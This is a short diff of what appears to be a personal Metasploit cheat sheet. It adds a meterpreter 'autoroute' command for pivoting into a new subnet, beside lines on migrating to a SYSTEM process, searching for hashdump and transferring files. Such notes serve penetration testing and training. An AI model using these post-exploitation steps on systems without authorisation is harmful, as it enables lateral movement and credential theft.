@@ -170,6 +170,10 @@ http://www.metasploit.com/
   > ps -U SYSTEM
   > migrate <PID> 
   
+  > autoroute:
+    > in meterpreter shell:
+      > run autoroute -s <IP of new Subnet> -n <Subnet Mask>
+  
   > search hashdump
   
   > upload / downlaod       // '\' Characters must be escaped -> eg 'C:\\Windows'
